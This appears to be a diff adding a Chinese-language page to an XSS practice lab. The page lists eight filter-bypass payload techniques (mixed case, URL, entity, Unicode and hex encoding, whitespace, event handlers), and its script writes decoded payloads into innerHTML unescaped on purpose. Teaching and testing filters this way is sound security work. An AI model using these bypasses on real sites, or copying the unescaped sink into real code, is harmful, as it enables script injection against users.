@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>绕过测试</title>
+  <link rel="stylesheet" href="assets/test.css">
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🎯 XSS绕过技术测试</h1>
+      <p>测试过滤绕过技巧</p>
+    </div>
+
+    <nav class="nav">
+      <a href="index.html">首页</a>
+      <a href="reflective-xss.html">反射型</a>
+      <a href="dom-xss.html">DOM型</a>
+      <a href="stored-xss.html">存储型</a>
+      <a href="bypass-test.html" class="active">绕过测试</a>
+      <a href="real-world.html">真实场景</a>
+    </nav>
+
+    <div class="content">
+      <div class="alert alert-info">
+        <strong>测试说明：</strong>
+        这些测试展示常见的过滤绕过技术，用于测试Web应用的安全过滤器是否足够严格。
+      </div>
+
+      <div class="test-section">
+        <h2>绕过技术列表</h2>
+        
+        <!-- 大小写绕过 -->
+        <div class="test-case">
+          <h4>1. 大小写绕过</h4>
+          <p>HTML标签不区分大小写，可以使用大小写混写绕过简单过滤</p>
+          
+          <div class="code-block">&lt;ScRiPt&gt;alert("XSS")&lt;/ScRiPt&gt;
+&lt;IMG SRC=x OnErRoR=alert("XSS")&gt;
+&lt;sVg OnLoAd=alert("XSS")&gt;</div>
+
+          <button class="btn" onclick="testBypass('case')">测试</button>
+        </div>
+
+        <!-- URL编码绕过 -->
+        <div class="test-case">
+          <h4>2. URL编码绕过</h4>
+          <p>使用URL编码绕过关键字过滤</p>
+          
+          <div class="code-block">%3Cscript%3Ealert("XSS")%3C/script%3E
+%3Cimg%20src=x%20onerror=alert("XSS")%3E</div>
+
+          <button class="btn" onclick="testBypass('url')">测试</button>
+        </div>
+
+        <!-- HTML实体编码 -->
+        <div class="test-case">
+          <h4>3. HTML实体编码</h4>
+          <p>使用HTML实体编码绕过过滤</p>
+          
+          <div class="code-block">&amp;lt;script&amp;gt;alert("XSS")&amp;lt;/script&amp;gt;
+&amp;#60;script&amp;#62;alert("XSS")&amp;#60;/script&amp;#62;</div>
+
+          <button class="btn" onclick="testBypass('entity')">测试</button>
+        </div>
+
+        <!-- Unicode编码 -->
+        <div class="test-case">
+          <h4>4. Unicode编码</h4>
+          <p>使用Unicode编码绕过过滤</p>
+          
+          <div class="code-block">\u003Cscript\u003Ealert("XSS")\u003C/script\u003E
+\x3Cscript\x3Ealert("XSS")</div>
+
+          <button class="btn" onclick="testBypass('unicode')">测试</button>
+        </div>
+
+        <!-- 十六进制编码 -->
+        <div class="test-case">
+          <h4>5. 十六进制编码</h4>
+          <p>使用十六进制编码绕过过滤</p>
+          
+          <div class="code-block">&#60;script&#62;alert("XSS")&#60;/script&#62;
+&#x3Cscript&#x3Ealert("XSS")</div>
+
+          <button class="btn" onclick="testBypass('hex')">测试</button>
+        </div>
+
+        <!-- 混合编码 -->
+        <div class="test-case">
+          <h4>6. 混合编码</h4>
+          <p>混合使用多种编码方式</p>
+          
+          <div class="code-block">%3CiMg%20SrC=x%20%6F%6E%65%72%72%6F%72=alert(1)%3E
+&lt;sc&#x72;ipt&gt;alert("XSS")&lt;/script&gt;</div>
+
+          <button class="btn" onclick="testBypass('mixed')">测试</button>
+        </div>
+
+        <!-- 空格绕过 -->
+        <div class="test-case">
+          <h4>7. 空格绕过</h4>
+          <p>使用Tab、换行等空白字符绕过</p>
+          
+          <div class="code-block">&lt;script
+&gt;alert("XSS")&lt;/script&gt;
+&lt;img	src=x	onerror=alert("XSS")&gt;</div>
+
+          <button class="btn" onclick="testBypass('space')">测试</button>
+        </div>
+
+        <!-- 事件处理器绕过 -->
+        <div class="test-case">
+          <h4>8. 事件处理器</h4>
+          <p>使用各种HTML事件处理器</p>
+          
+          <div class="code-block">&lt;body onload=alert("XSS")&gt;
+&lt;input onfocus=alert("XSS") autofocus&gt;
+&lt;details open ontoggle=alert("XSS")&gt;</div>
+
+          <button class="btn" onclick="testBypass('event')">测试</button>
+        </div>
+      </div>
+
+      <div id="bypassResult" class="result-area">
+        <h4>测试结果：</h4>
+        <div id="bypassResultContent"></div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>© 2024 安全助手 - XSS测试环境</p>
+    </div>
+  </div>
+
+  <script src="assets/test.js"></script>
+  <script>
+    const bypassPayloads = {
+      case: '<ScRiPt>alert("XSS")</ScRiPt>',
+      url: '%3Cscript%3Ealert("XSS")%3C/script%3E',
+      entity: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
+      unicode: '\\u003Cscript\\u003Ealert("XSS")',
+      hex: '&#60;script&#62;alert("XSS")&#60;/script&#62;',
+      mixed: '%3CiMg%20SrC=x%20onerror=alert(1)%3E',
+      space: '<script\n>alert("XSS")</script>',
+      event: '<body onload=alert("XSS")>'
+    };
+
+    function testBypass(type) {
+      const payload = bypassPayloads[type];
+      const resultEl = document.getElementById('bypassResult');
+      const contentEl = document.getElementById('bypassResultContent');
+      
+      // 解码并显示
+      let decodedPayload = payload;
+      try {
+        decodedPayload = decodeURIComponent(decodedPayload);
+      } catch(e) {}
+      
+      contentEl.innerHTML = `
+        <p><strong>原始载荷：</strong></p>
+        <div class="code-block">${window.testUtils.escapeHtml(payload)}</div>
+        <p><strong>解码后：</strong></p>
+        <div class="code-block">${window.testUtils.escapeHtml(decodedPayload)}</div>
+        <div style="margin-top: 15px; padding: 15px; background: #fff; border-left: 4px solid #ffc107;">
+          ${decodedPayload}
+        </div>
+      `;
+      
+      resultEl.classList.add('show');
+      
+      window.testUtils.reportTestResult('bypass-' + type, {
+        payload: payload,
+        decoded: decodedPayload,
+        vulnerable: true
+      });
+    }
+  </script>
+  <script src="assets/xss-detector.js"></script>
+</body>
+</html>
+
